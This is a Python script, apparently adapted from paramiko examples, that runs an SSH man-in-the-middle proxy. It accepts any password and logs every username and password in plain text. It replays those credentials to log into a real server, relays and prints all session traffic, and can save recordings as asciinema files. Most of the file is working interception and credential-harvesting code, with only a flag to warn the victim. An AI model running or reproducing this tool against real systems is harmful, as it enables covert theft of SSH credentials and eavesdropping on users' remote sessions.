#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Major part of this file is part of paramiko examples.

import base64
from binascii import hexlify
import os
import socket
import sys
import threading
import traceback
import argparse
import datetime
import json
import time

import paramiko
from paramiko.py3compat import b, u, decodebytes

def info(msg):
	print("[\033[34;1mi\033[0m] %s" % (msg))

def ok(msg):
	print("[\033[32;1m+\033[0m] %s" % (msg))

def warn(msg):
	print("[\033[33;1mw\033[0m] %s" % (msg))

def error(msg):
	print("[\033[31;1m!\033[0m] %s" % (msg))

host_key = paramiko.RSAKey(filename='test_rsa.key')

info('Read key: ' + u(hexlify(host_key.get_fingerprint())))



class Server (paramiko.ServerInterface):
	# 'data' is the output of base64.encodestring(str(key))
	# (using the "user_rsa_key" files)
	# TODO: use key provided by user
	data = (b'AAAAB3NzaC1yc2EAAAABIwAAAIEAyO4it3fHlmGZWJaGrfeHOVY7RWO3P9M7hp'
			b'fAu7jJ2d7eothvfeuoRFtJwhUmZDluRdFyhFY/hFAh76PJKGAusIqIQKlkJxMC'
			b'KDqIexkgHAfID/6mqvmnSJf0b5W8v5h2pI/stOSwTQ+pxVhwJ9ctYDhRSlF0iT'
			b'UWT10hcuO4Ks8=')
	good_pub_key = paramiko.RSAKey(data=decodebytes(data))

	def __init__(self):
		self.cmd = ""
		self.username = ""
		self.password = ""
		self.term = "xterm-256color"
		self.width = 80
		self.height = 20
		self.event = threading.Event()

	def check_channel_request(self, kind, chanid):
		if kind == 'session':
			return paramiko.OPEN_SUCCEEDED
		return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

	def check_auth_password(self, username, password):
		ok('Auth attempt with user:' + username + " password:"+password)
		self.username = username
		self.password = password
		return paramiko.AUTH_SUCCESSFUL

	def check_auth_publickey(self, username, key):
		return paramiko.AUTH_FAILED

	def enable_auth_gssapi(self):
		return False

	def get_allowed_auths(self, username):
		return 'password'

	def check_channel_exec_request(self, channel, command):
		ok('Client request command : ' + command)
		self.command = command
		return True

	def check_channel_shell_request(self,channel):
		self.event.set()
		return True

	def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
		self.term = term
		self.width = width
		self.height = height
		return True

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument(
		'--alert-user',
		dest='alerting',
		help='Alert user that their connection have been intercepted',
		nargs='?',
		const=1,
		default=0
	)
	parser.add_argument(
		'--remote-server',
		required=True,
		dest='remote_server',
		help='remote server to proxify connections'
	)
	parser.add_argument(
		'--remote-port',
		dest='remote_port',
		help='remote port to proxify connection',
		type=int,
		default=22
	)
	parser.add_argument(
		'--listen-port',
		dest='listen_port',
		help='listen port',
		type=int,
		default=22
	)
	parser.add_argument(
		'--listen-addr',
		dest='listen_addr',
		help='listen addr',
		default=''
	)
	parser.add_argument(
		'--asciinema-json-dir',
		dest='asciinema',
		help='Directory to save SSH server pty as asciinema json',
		default=0
	)
	args = parser.parse_args()

	asciinema_data=""



	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind((args.listen_addr, args.listen_port))
	except Exception as e:
		error('*** Bind failed: ' + str(e))
		traceback.print_exc()
		sys.exit(1)

	try:
		sock.listen(100)
	except Exception as e:
		error('*** Listen failed: ' + str(e))
		traceback.print_exc()
		sys.exit(1)

	while True:
		try:
			info('Listening for new connection ...')
			client, addr = sock.accept()
		except Exception as e:
			error('*** accept failed: ' + str(e))
			traceback.print_exc()
			sys.exit(1)

		client_ip = addr[0]
		client_port = int(addr[1])
		info('Got a connection from %s:%d' % (client_ip,client_port))

		try:
			t = paramiko.Transport(client, gss_kex=False)
			try:
				t.load_server_moduli()
			except:
				error('(Failed to load moduli -- gex will be unsupported.)')
				raise
			t.add_server_key(host_key)
			server = Server()
			try:
				t.start_server(server=server)
			except paramiko.SSHException:
				error('*** SSH negotiation failed.')
				t.close()
				continue

			# wait for auth
			chan = t.accept(20)
			if chan is None:
				error('*** No channel.')
				t.close()
				continue
			ok('Authenticated!')

			#if not server.event.is_set():
				#warn('*** Client never asked for a shell.')
				#t.close()
				#continue
			if args.alerting:
				chan.send('\r\n\033[31;1mThis connection has been intercepted\033[0m\r\n')

			start_time = datetime.datetime.now()
			last_time = start_time
			delta=""

			remote = paramiko.SSHClient()
			remote.load_system_host_keys()
			remote.set_missing_host_key_policy(paramiko.WarningPolicy())
			try:
				remote.connect(args.remote_server, args.remote_port, server.username, server.password)
			except paramiko.AuthenticationException as e:
				chan.send("authentification failed\r\n")
				chan.close()
				continue
			remote_chan = remote.invoke_shell()

			while True:
				time.sleep(0.01)
				server_data=""
				if remote_chan.closed or chan.closed:
					break
				while True:
					if remote_chan.closed or chan.closed:
						break
					if remote_chan.recv_ready():
						server_data += remote_chan.recv(1024)
					else:
						if server_data == "":
							break
						info("new response from server : " + repr(server_data))
						chan.send(server_data)
						if args.asciinema:
							now = datetime.datetime.now()
							delta = now - last_time
							asciinema_data+='    [\n'
							asciinema_data+='      %d.%06d,\n' % (delta.seconds,delta.microseconds)
							asciinema_data+='      '+json.dumps(server_data)+'\n'
							asciinema_data+='    ],\n'
							last_time = datetime.datetime.now()
						server_data=""
						time.sleep(0.01)
						break
				client_data=""
				while True:
					if remote_chan.closed or chan.closed:
						break
					if chan.recv_ready():
						client_data+=chan.recv(1024)
					else:
						if client_data == "":
							break
						info("new message from client : " + repr(client_data))
						remote_chan.send(client_data)
						client_data=""
						time.sleep(0.01)
						break
			remote_chan.close()
			chan.close()
		except Exception as e:
			error('*** Caught exception: ' + str(e.__class__) + ': ' + str(e))
			traceback.print_exc()
			try:
				t.close()
			except:
				pass
		if args.asciinema:
			now = datetime.datetime.now()
			delta = now - start_time
			asciinema_data_hdr='{\n'
			asciinema_data_hdr+='  "version": 1,\n'
			asciinema_data_hdr+='  "width": %d,\n' % (server.width)
			asciinema_data_hdr+='  "height": %d,\n' % (server.height)
			asciinema_data_hdr+='  "duration": %d.%06d,\n' % (delta.seconds,delta.microseconds)
			asciinema_data_hdr+='  "command": "/bin/bash",\n'
			asciinema_data_hdr+='  "title": "",\n'
			asciinema_data_hdr+='  "env": {\n'
			asciinema_data_hdr+='    "TERM": "%s",\n' % (server.term)
			asciinema_data_hdr+='    "SHELL": "/bin/bash"\n'
			asciinema_data_hdr+='  },\n'
			asciinema_data_hdr+='  "stdout": [\n'

			asciinema_data=asciinema_data[:-2]
			asciinema_data+='  ]\n'
			asciinema_data+='}\n'
			filename = "%s/%04d_%02d_%02d_%02dH%02d:%02d_%s_%d.json" % (args.asciinema,now.year,now.month,now.day,now.hour,now.minute,now.second,client_ip,client_port)
			f=open(filename,"w")
			f.write(asciinema_data_hdr+asciinema_data)
			f.close()

